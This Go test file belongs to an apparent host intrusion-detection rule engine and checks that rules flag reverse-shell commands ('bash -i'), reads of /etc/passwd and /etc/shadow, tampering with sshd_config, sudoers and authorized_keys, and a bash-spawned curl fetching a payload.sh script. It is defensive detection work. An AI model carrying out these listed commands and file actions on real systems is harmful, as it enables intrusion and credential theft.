package rule

import (
	"testing"

	"diting/backend/internal/audit"
)

func TestApplyRulesEnrichesMatchingEvent(t *testing.T) {
	event := audit.Event{
		EventType: "process_exec",
		Cmdline:   "/usr/bin/bash -i",
		Severity:  "info",
		RiskScore: 0,
	}
	rules := []Rule{
		{
			ID:        "rule-1",
			Name:      "reverse shell",
			EventType: "process_exec",
			Enabled:   true,
			Severity:  "high",
			RiskScore: 85,
			MatchExpr: Expression{
				Operator: "and",
				Conditions: []Condition{
					{Field: "cmdline", Op: "contains", Value: "bash -i"},
				},
			},
			Tags: []string{"reverse-shell"},
		},
	}

	enriched := ApplyRules(event, rules)

	if enriched.Severity != "high" {
		t.Fatalf("expected high severity, got %q", enriched.Severity)
	}
	if enriched.RiskScore != 85 {
		t.Fatalf("expected risk score 85, got %d", enriched.RiskScore)
	}
	if len(enriched.Tags) != 1 || enriched.Tags[0] != "reverse-shell" {
		t.Fatalf("expected reverse-shell tag, got %#v", enriched.Tags)
	}
	if len(enriched.RuleIDs) != 1 || enriched.RuleIDs[0] != "rule-1" {
		t.Fatalf("expected rule id rule-1, got %#v", enriched.RuleIDs)
	}
	if len(enriched.RuleNames) != 1 || enriched.RuleNames[0] != "reverse shell" {
		t.Fatalf("expected rule name, got %#v", enriched.RuleNames)
	}
	if len(enriched.RuleMatches) != 1 {
		t.Fatalf("expected one rule match, got %#v", enriched.RuleMatches)
	}
	match := enriched.RuleMatches[0]
	if match.RuleID != "rule-1" || match.RuleName != "reverse shell" || match.Field != "cmdline" || match.Operator != "contains" || match.Value != "bash -i" || match.Actual != "/usr/bin/bash -i" {
		t.Fatalf("unexpected rule match %#v", match)
	}
}

func TestApplyRulesIgnoresDisabledRules(t *testing.T) {
	event := audit.Event{EventType: "process_exec", Cmdline: "bash -i", Severity: "info"}
	rules := []Rule{{
		ID:        "rule-1",
		Name:      "disabled",
		EventType: "process_exec",
		Enabled:   false,
		Severity:  "critical",
		RiskScore: 100,
		MatchExpr: Expression{Operator: "and", Conditions: []Condition{{Field: "cmdline", Op: "contains", Value: "bash -i"}}},
	}}

	enriched := ApplyRules(event, rules)

	if enriched.Severity != "info" {
		t.Fatalf("expected original severity info, got %q", enriched.Severity)
	}
	if len(enriched.RuleIDs) != 0 {
		t.Fatalf("expected no rule hits, got %#v", enriched.RuleIDs)
	}
}

func TestApplyRulesEnrichesSensitiveFileAccessEvent(t *testing.T) {
	event := audit.Event{
		EventType:     "file_access",
		FilePath:      "/etc/passwd",
		FileOperation: "open",
		Severity:      "info",
		RiskScore:     0,
	}
	rules := []Rule{{
		ID:        "rule-file",
		Name:      "敏感文件探针访问",
		EventType: "file_access",
		Enabled:   true,
		Severity:  "high",
		RiskScore: 80,
		MatchExpr: Expression{
			Operator: "and",
			Conditions: []Condition{
				{Field: "event_type", Op: "eq", Value: "file_access"},
				{Field: "file_path", Op: "in", Values: []string{"/etc/passwd", "/etc/shadow"}},
			},
		},
		Tags: []string{"sensitive-file"},
	}}

	enriched := ApplyRules(event, rules)

	if enriched.Severity != "high" || enriched.RiskScore != 80 {
		t.Fatalf("expected high sensitive file risk, got severity=%q score=%d", enriched.Severity, enriched.RiskScore)
	}
	if len(enriched.RuleNames) != 1 || enriched.RuleNames[0] != "敏感文件探针访问" {
		t.Fatalf("expected sensitive file rule hit, got %#v", enriched.RuleNames)
	}
	if len(enriched.RuleMatches) != 2 {
		t.Fatalf("expected file rule match details, got %#v", enriched.RuleMatches)
	}
}

func TestApplyRulesEnrichesSensitiveFileWritePermissionAndDeleteEvents(t *testing.T) {
	tests := []struct {
		name          string
		filePath      string
		fileOperation string
		ruleName      string
		severity      string
		riskScore     uint8
		operationOps  []string
	}{
		{
			name:          "write",
			filePath:      "/etc/ssh/sshd_config",
			fileOperation: "write",
			ruleName:      "敏感文件写入",
			severity:      "critical",
			riskScore:     92,
			operationOps:  []string{"write", "truncate", "create"},
		},
		{
			name:          "permission",
			filePath:      "/etc/sudoers",
			fileOperation: "chmod",
			ruleName:      "敏感文件权限变更",
			severity:      "critical",
			riskScore:     90,
			operationOps:  []string{"chmod", "chown", "fchmod", "fchown", "setxattr"},
		},
		{
			name:          "delete",
			filePath:      "/root/.ssh/authorized_keys",
			fileOperation: "unlink",
			ruleName:      "敏感文件删除",
			severity:      "critical",
			riskScore:     94,
			operationOps:  []string{"unlink", "unlinkat", "rmdir"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			event := audit.Event{
				EventType:     "file_access",
				FilePath:      tt.filePath,
				FileOperation: tt.fileOperation,
				Severity:      "info",
				RiskScore:     0,
			}
			rules := []Rule{{
				ID:        "rule-" + tt.name,
				Name:      tt.ruleName,
				EventType: "file_access",
				Enabled:   true,
				Severity:  tt.severity,
				RiskScore: int(tt.riskScore),
				MatchExpr: Expression{
					Operator: "and",
					Conditions: []Condition{
						{Field: "event_type", Op: "eq", Value: "file_access"},
						{Field: "file_path", Op: "regex", Value: "(^/etc/|^/root/\\.ssh/|^/home/[^/]+/\\.ssh/)"},
						{Field: "file_operation", Op: "in", Values: tt.operationOps},
					},
				},
				Tags: []string{"file-access"},
			}}

			enriched := ApplyRules(event, rules)

			if enriched.Severity != tt.severity || enriched.RiskScore != tt.riskScore {
				t.Fatalf("expected %s risk score %d, got severity=%q score=%d", tt.severity, tt.riskScore, enriched.Severity, enriched.RiskScore)
			}
			if len(enriched.RuleNames) != 1 || enriched.RuleNames[0] != tt.ruleName {
				t.Fatalf("expected rule %q, got %#v", tt.ruleName, enriched.RuleNames)
			}
		})
	}
}

func TestApplyRulesEnrichesSuspiciousProcessChainEvent(t *testing.T) {
	event := audit.Event{
		EventType:         "network_connect",
		ParentProcessName: "bash",
		ParentCmdline:     "/bin/bash -l",
		ProcessName:       "curl",
		Cmdline:           "/usr/bin/curl http://10.0.0.8/payload.sh",
		DstIP:             "10.0.0.8",
		DstPort:           80,
		Severity:          "info",
		RiskScore:         0,
	}
	rules := []Rule{{
		ID:        "rule-process-chain",
		Name:      "Shell 下载工具外联链路",
		EventType: "network_connect",
		Enabled:   true,
		Severity:  "high",
		RiskScore: 85,
		MatchExpr: Expression{
			Operator: "and",
			Conditions: []Condition{
				{Field: "event_type", Op: "eq", Value: "network_connect"},
				{Field: "parent_process_name", Op: "in", Values: []string{"bash", "sh", "dash", "zsh"}},
				{Field: "process_name", Op: "in", Values: []string{"curl", "wget"}},
			},
		},
		Tags: []string{"process-chain", "network"},
	}}

	enriched := ApplyRules(event, rules)

	if enriched.Severity != "high" || enriched.RiskScore != 85 {
		t.Fatalf("expected suspicious process chain risk, got severity=%q score=%d", enriched.Severity, enriched.RiskScore)
	}
	if len(enriched.RuleNames) != 1 || enriched.RuleNames[0] != "Shell 下载工具外联链路" {
		t.Fatalf("expected process chain rule hit, got %#v", enriched.RuleNames)
	}
	if len(enriched.RuleMatches) != 3 {
		t.Fatalf("expected process chain match details, got %#v", enriched.RuleMatches)
	}
}
